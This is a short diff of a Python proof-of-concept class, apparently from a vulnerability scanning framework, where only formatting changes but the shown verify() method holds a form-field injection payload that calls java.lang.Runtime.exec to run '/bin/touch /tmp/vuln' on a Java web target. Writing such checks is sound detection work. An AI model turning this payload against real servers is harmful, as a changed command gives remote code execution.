@@ -43,9 +43,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             # 命令执行漏洞验证,这里去ping一个服务器做测试或者用dnslog去验证,具体验证结果等服务器搭建起来去完善.
             data = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/touch /tmp/vuln")]=test&password=test&repeatedPassword=test'''
